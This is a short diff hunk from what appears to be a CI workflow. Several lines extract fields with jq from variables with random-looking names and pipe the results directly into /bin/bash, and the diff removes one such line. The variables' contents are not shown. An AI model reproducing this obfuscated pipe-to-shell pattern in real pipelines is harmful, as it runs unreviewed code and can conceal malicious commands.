@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$vn2" | jq -r .p1 | /bin/bash
           printf '%s' "$unk50" | jq -r .paj87707 | /bin/bash
           echo $t68 | jq -r .o4 | /bin/bash
-          printf '%s' "$illzp3991" | jq -r .vg867 | /bin/bash
           printf '%s' "$w9361" | jq -r .asxn2575 | /bin/bash
 
       - name: Save results
